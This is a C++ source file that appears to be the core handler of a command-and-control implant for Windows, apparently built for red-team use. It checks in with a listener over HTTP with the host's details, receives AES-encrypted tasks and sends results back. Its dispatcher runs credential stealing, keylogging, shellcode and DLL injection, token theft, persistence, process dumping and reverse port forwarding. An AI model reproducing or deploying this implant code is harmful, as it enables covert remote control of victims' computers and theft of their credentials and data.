#include "core/handler.hpp"

namespace Handler
{
    VOID HTTPInit(State::PSTATE pState)
    {
		System::Http::WinHttpHandlers handlers = System::Http::RequestInit(
            pState->pProcs,
            pState->lpListenerHost,
            pState->nListenerPort
        );

        pState->hSession = handlers.hSession;
        pState->hConnect = handlers.hConnect;
    }

    VOID HTTPClose(State::PSTATE pState)
    {
        System::Http::WinHttpCloseHandles(
            pState->pProcs,
            pState->hSession,
            pState->hConnect,
            pState->hRequest
        );
    }

    std::wstring GetInitialInfoJSON(State::PSTATE pState)
    {
        std::wstring wOS = L"windows";
        std::wstring wArch = L"";
        std::wstring wHostname = L"";
        std::wstring wListenerURL = L"";
        std::wstring wSleep = Utils::Convert::UTF8Decode(std::to_string(pState->nSleep));
        std::wstring wJitter = Utils::Convert::UTF8Decode(std::to_string(pState->nJitter));
        std::wstring wKillDate = Utils::Convert::UTF8Decode(std::to_string(pState->nKillDate));
        std::wstring wAesKey = AES_KEY_BASE64_W;
        std::wstring wAesIV = AES_IV_BASE64_W;

        // Get listener URL
        wListenerURL += std::wstring(pState->lpListenerProto);
        wListenerURL += L"://";
        wListenerURL +=	std::wstring(pState->lpListenerHost);
        wListenerURL +=	L":";
        wListenerURL +=	Utils::Convert::UTF8Decode(std::to_string(pState->nListenerPort));

        // Get architecture
        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);
        wArch = System::Arch::ArchGetName(systemInfo.wProcessorArchitecture);

        // Get hostname and convert it to wstring
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
        {
            char szHostname[256] = "";
            gethostname(szHostname, 256);
            std::string sHostname(szHostname);
            wHostname = Utils::Convert::UTF8Decode(sHostname);
        }

        std::wstring wJson = L"{";
        wJson += L"\"os\":\"" + wOS + L"\"";
        wJson += L",";
        wJson += L"\"arch\":\"" + wArch + L"\"";
        wJson += L",";
        wJson += L"\"hostname\":\"" + wHostname + L"\"";
        wJson += L",";
        wJson += L"\"listenerURL\":\"" + wListenerURL + L"\"";
        wJson += L",";
        wJson += L"\"implantType\":\"" + std::wstring(pState->lpPayloadType) + L"\"";
        wJson += L",";
        wJson += L"\"sleep\":" + wSleep + L"";
        wJson += L",";
        wJson += L"\"jitter\":" + wJitter + L"";
        wJson += L",";
        wJson += L"\"killDate\":" + wKillDate + L"";
        wJson += L",";
        wJson += L"\"aesKey\":\"" + wAesKey + L"\"";
        wJson += L",";
        wJson += L"\"aesIV\":\"" + wAesIV + L"\"";
        wJson += L"}";

        return wJson;
    }

    // If success, gets the agent UUID. This value will be used for subsequent processes.
    BOOL CheckIn(
        State::PSTATE pState,
        const std::wstring& wInfoJson
    ) {
        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);

        System::Http::WinHttpResponse resp = System::Http::RequestSend(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathCheckIn,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJson.c_str(),
            (DWORD)strlen(sInfoJson.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        // Receive the agent UUID.
        pState->wUUID = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
        
        return TRUE;
    }

    BOOL TaskGet(State::PSTATE pState)
    {
        std::wstring wHeader = L"X-UUID: " + pState->wUUID + L"\r\n";

        System::Http::WinHttpResponse resp = System::Http::RequestSend(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathTaskGet,
            L"GET",
            wHeader.c_str(),
            NULL,
            0
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        pState->hRequest = resp.hRequest;

        std::wstring wTaskEnc = System::Http::ResponseRead(pState->pProcs, resp.hRequest);

        // We need to decrypt and encrypt to send back the task value for server-side decryption correctly.
        std::vector<BYTE> taskDec = Crypt::Decrypt(
            wTaskEnc,
            pState->pCrypt->pAES->hKey,
            pState->pCrypt->pAES->iv
        );
        if (taskDec.size() == 0)
        {
            return FALSE;
        }

        pState->wTask = Crypt::Encrypt(
            taskDec,
            pState->pCrypt->pAES->hKey,
            pState->pCrypt->pAES->iv
        );

        // Parse the task to JSON
        pState->taskJSON = Parser::ParseTask(
            taskDec,
            pState->pCrypt->pAES->hKey,
            pState->pCrypt->pAES->iv
        );

        return TRUE;
    }

    BOOL TaskExecute(State::PSTATE pState)
    {
        INT commandCode = pState->taskJSON["command"]["code"];
        json args = pState->taskJSON["args"];

        std::wstring wTaskResult;

        switch(commandCode)
        {
            case TASK_CAT:
                wTaskResult = Task::Cat(pState, Utils::Convert::UTF8Decode(args["path"]));
                break;
            case TASK_CD:
                wTaskResult = Task::Cd(pState, Utils::Convert::UTF8Decode(args["path"]));
                break;
            case TASK_CONNECT:
                wTaskResult = Task::Connect(pState, Utils::Convert::UTF8Decode(args["url"]));
                break;
            case TASK_CP:
                wTaskResult = Task::Cp(
                    pState,
                    Utils::Convert::UTF8Decode(args["src"]),
                    Utils::Convert::UTF8Decode(args["dest"])
                );
                break;
            case TASK_CREDS_STEAL:
                wTaskResult = Task::CredsSteal(pState);
                break;
            case TASK_DLL:
                wTaskResult = Task::Dll(
                    pState,
                    Utils::Convert::UTF8Decode(args["pid"]),
                    Utils::Convert::UTF8Decode(args["dll"])
                );
                break;
            case TASK_DOWNLOAD:
                wTaskResult = Task::Download(
                    pState,
                    Utils::Convert::UTF8Decode(args["src"]),
                    Utils::Convert::UTF8Decode(args["dest"])
                );
                break;
            case TASK_ENV_LS:
                wTaskResult = Task::EnvLs(pState);
                break;
            case TASK_EXECUTE:
                wTaskResult = Task::Execute(pState, Utils::Convert::UTF8Decode(args["cmd"]));
                break;
            case TASK_GROUP_LS:
                wTaskResult = Task::GroupLs();
                break;
            case TASK_HISTORY:
                wTaskResult = Task::History(pState);
                break;
            case TASK_IP:
                wTaskResult = Task::Ip();
                break;
            case TASK_JITTER:
                wTaskResult = Task::JitterSet(pState, Utils::Convert::UTF8Decode(args["time"]));
                break;
            case TASK_KEYLOG:
                wTaskResult = Task::KeyLog(Utils::Convert::UTF8Decode(args["time"]));
                break;
            case TASK_KILL:
                wTaskResult = Task::Kill(pState);
                break;
            case TASK_KILLDATE:
                wTaskResult = Task::KillDateSet(pState, Utils::Convert::UTF8Decode(args["datetime"]));
                break;
            case TASK_LS:
                wTaskResult = Task::Ls(pState, Utils::Convert::UTF8Decode(args["path"]));
                break;
            case TASK_MIGRATE:
                wTaskResult = Task::Migrate(pState, Utils::Convert::UTF8Decode(args["pid"]));
                break;
            case TASK_MKDIR:
                wTaskResult = Task::Mkdir(pState, Utils::Convert::UTF8Decode(args["path"]));
                break;
            case TASK_MV:
                wTaskResult = Task::Mv(
                    pState,
                    Utils::Convert::UTF8Decode(args["src"]),
                    Utils::Convert::UTF8Decode(args["dest"])
                );
                break;
            case TASK_NET:
                wTaskResult = Task::Net();
                break;
            case TASK_PERSIST:
                wTaskResult = Task::Persist(pState, Utils::Convert::UTF8Decode(args["technique"]));
                break;
            case TASK_PROCDUMP:
                wTaskResult = Task::Procdump(pState, Utils::Convert::UTF8Decode(args["pid"]));
                break;
            case TASK_PS_KILL:
                wTaskResult = Task::PsKill(pState, Utils::Convert::UTF8Decode(args["pid"]));
                break;
            case TASK_PS_LS:
                wTaskResult = Task::PsLs(
                    pState,
                    Utils::Convert::UTF8Decode(args["filter"]),
                    Utils::Convert::UTF8Decode(args["exclude"])
                );
                break;
            case TASK_PWD:
                wTaskResult = Task::Pwd(pState);
                break;
            case TASK_REG_QUERY:
                wTaskResult = Task::RegQuery(
                    pState,
                    Utils::Convert::UTF8Decode(args["rootkey"]),
                    Utils::Convert::UTF8Decode(args["subkey"]),
                    Utils::Convert::UTF8Decode(args["recursive"]) == L"true"
                );
                break;
            case TASK_RM:
                wTaskResult = Task::Rm(pState, Utils::Convert::UTF8Decode(args["path"]));
                break;
            case TASK_RMDIR:
                wTaskResult = Task::Rmdir(Utils::Convert::UTF8Decode(args["path"]));
                break;
            case TASK_RPORTFWD_ADD:
                wTaskResult = Task::RportfwdAdd(
                    pState,
                    Utils::Convert::UTF8Decode(args["lhost"]),
                    Utils::Convert::UTF8Decode(args["lport"]),
                    Utils::Convert::UTF8Decode(args["fhost"]),
                    Utils::Convert::UTF8Decode(args["fport"])
                );
                break;
            case TASK_RPORTFWD_LS:
                wTaskResult = Task::RportfwdLs(pState);
                break;
            case TASK_RPORTFWD_RM:
                wTaskResult = Task::RportfwdRm(pState);
                break;
            case TASK_RUNAS:
                wTaskResult = Task::RunAs(
                    pState,
                    Utils::Convert::UTF8Decode(args["username"]),
                    Utils::Convert::UTF8Decode(args["password"]),
                    Utils::Convert::UTF8Decode(args["cmd"])
                );
                break;
            case TASK_SCREENSHOT:
                 // Is DLL implant, the screenshot feature is not available.
                #ifndef IS_DLL
                wTaskResult = Task::Screenshot(pState);
                #else
                wTaskResult = L"Cannot take a screenshot on DLL";
                #endif
                break;
            case TASK_SHELLCODE:
                if (args.size() != 2)
                {
                    return FALSE;
                }
                wTaskResult = Task::Shellcode(
                    pState,
                    Utils::Convert::UTF8Decode(args["pid"]),
                    Utils::Convert::UTF8Decode(args["shellcode"])
                );
                break;
            case TASK_SLEEP:
                wTaskResult = Task::SleepSet(pState, Utils::Convert::UTF8Decode(args["time"]));
                break;
            case TASK_TOKEN_REVERT:
                wTaskResult = Task::TokenRevert();
                break;
            case TASK_TOKEN_STEAL:
                wTaskResult = Task::TokenSteal(
                    pState,
                    Utils::Convert::UTF8Decode(args["pid"]),
                    Utils::Convert::UTF8Decode(args["process"]),
                    Utils::Convert::UTF8Decode(args["login"]) == L"true"
                );
                break;
            case TASK_UPLOAD:
                wTaskResult = Task::Upload(
                    pState,
                    Utils::Convert::UTF8Decode(args["src"]),
                    Utils::Convert::UTF8Decode(args["dest"])
                );
                break;
            case TASK_USER_LS:
                wTaskResult = Task::Users(pState);
                break;
            case TASK_WHOAMI:
                wTaskResult = Task::Whoami(pState);
                break;
            case TASK_WHOAMI_PRIV:
                wTaskResult = Task::WhoamiPriv(pState);
                break;
            default:
                wTaskResult = L"Error: Invalid task.";
        }

        // Convert the result to JSON
        json resultJSON;
        resultJSON["task"]["command"] = pState->taskJSON["command"];
        resultJSON["task"]["args"] = pState->taskJSON["args"];
        resultJSON["result"] = Utils::Convert::UTF8Encode(wTaskResult);
        pState->taskResultJSON = resultJSON;

        return TRUE;
    }

    BOOL TaskResultSend(State::PSTATE pState)
    {
        // Prepare additional headers
        std::wstring wHeaders;
        wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";

        // Encrypt task result
        std::string sTaskResultJSON = pState->taskResultJSON.dump();
        std::wstring wEnc = Crypt::Encrypt(
            std::vector<BYTE>(sTaskResultJSON.begin(), sTaskResultJSON.end()),
            pState->pCrypt->pAES->hKey,
            pState->pCrypt->pAES->iv
        );
        std::string sEnc = Utils::Convert::UTF8Encode(wEnc);

        System::Http::WinHttpResponse resp = System::Http::RequestSend(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathTaskResult,
            L"POST",
            wHeaders.c_str(),
            (LPVOID)sEnc.c_str(),
            (DWORD)strlen(sEnc.c_str())
        );

        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return FALSE;
        }

        return TRUE;
    }

    BOOL Task(State::PSTATE pState)
    {
        if (Handler::TaskGet(pState))
        {
            Handler::TaskExecute(pState);
            Handler::TaskResultSend(pState);
            return TRUE;
        }

        return FALSE;
    }

    // BOOL SocketAccept(State::PSTATE pState)
    // {
    //     Socket::PSOCKET_DATA pSocket = NULL;
    //     Socket::PSOCKET_DATA pClientSocket  = NULL;
    //     SOCKET clientSocket = 0;
    //     u_long ulIOBlock = 1;

    //     pSocket = pState->pSocket;
        
    //     while (true)
    //     {
    //         if (!pSocket)
    //             break;

    //         if (pSocket->bShouldRemove)
    //         {
    //             pSocket = pSocket->next;
    //             continue;
    //         }

    //         // Accept connections
    //         if (pSocket->dwType == SOCKET_TYPE_REVERSE_PORT_FORWARDING)
    //         {
    //             clientSocket = accept(pSocket->socket, NULL, NULL);
    //             if (clientSocket != INVALID_SOCKET)
    //             {
    //                 if (ioctlsocket(clientSocket, FIONBIO, &ulIOBlock) != SOCKET_ERROR)
    //                 {
    //                     pClientSocket = Socket::NewSocket(
    //                         SOCKET_TYPE_CLIENT,
    //                         pSocket->dwLIP,
    //                         pSocket->dwLPort,
    //                         pSocket->dwFwdIP,
    //                         pSocket->dwFwdPort,
    //                         pSocket->dwID
    //                     );
    //                     if (!pClientSocket)
    //                     {
    //                         continue;
    //                     }

    //                     // Send the socket open request.
    //                     // System::Http::SendRequest(
    //                     //     pState->hConnect,
    //                     //     pState->lpListenerHost,
    //                     //     pState->nListenerPort,
    //                     //     ...
    //                     // )
    //                 }
    //             }
    //         }

    //         pSocket = pSocket->next;
    //     }

    //     return TRUE;
    // }

    // Reference:
    // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/Socket.c#L281
    // BOOL SocketRead(State::PSTATE pState)
    // {
    //     Socket::PSOCKET_DATA pSocket = NULL;
    //     PVOID newBuf = NULL;
    //     char recvBuf[512];
    //     int recvBufLen = 512;
    //     BOOL bResult = FALSE;
    //     int iResult, iSendResult;

    //     pSocket = pState->pSocket;

    //     while (true)
    //     {
    //         if (!pSocket)
    //             break;

    //         if (pSocket->bShouldRemove)
    //         {
    //             pSocket = pSocket->next;
    //             continue;
    //         }

    //         if (pSocket->dwType == SOCKET_TYPE_CLIENT)
    //         {
    //             // Read data from connected clients.
    //             do
    //             {
    //                 iResult = recv(pSocket->socket, recvBuf, recvBufLen, 0);
    //                 if (iResult > 0)
    //                 {
    //                     // Data received
    //                     // ...

                        
    //                     // Send data to connected clients
    //                     iSendResult = send(pSocket->socket, recvBuf, iResult, 0);
    //                     if (iSendResult == SOCKET_ERROR)
    //                     {
    //                     }
    //                 }
    //             } while (iResult > 0);
    //         }

    //         pSocket = pSocket->next;
    //     }

    //     return TRUE;
    // }

    //
    // BOOL SocketClose(State::PSTATE pState)
    // {

    // }

    // Kill every dead/removed socket.
    // BOOL SocketKill(State::PSTATE pState)
    // {

    // }

    // BOOL Socket(State::PSTATE pState)
    // {
    //     SocketAccept(pState);
    //     // SocketRead(pState);
    //     // SocketKill(pState);

    //     return TRUE;
    // }

    BOOL IsKillDateReached(INT nKillDate)
    {
        SYSTEMTIME currentTime;
        GetSystemTime(&currentTime);

        // Convert the current time to timestamp.
        FILETIME currentFileTime;
        SystemTimeToFileTime(&currentTime, &currentFileTime);
        ULARGE_INTEGER currentTimestamp;
        currentTimestamp.LowPart = currentFileTime.dwLowDateTime;
        currentTimestamp.HighPart = currentFileTime.dwHighDateTime;
        INT currentTimestampSeconds = currentTimestamp.QuadPart / 10000000 - 11644473600;

        if (currentTimestampSeconds >= nKillDate)
        {
            return TRUE;
        }
        else
        {
            return FALSE;
        }
    }
}
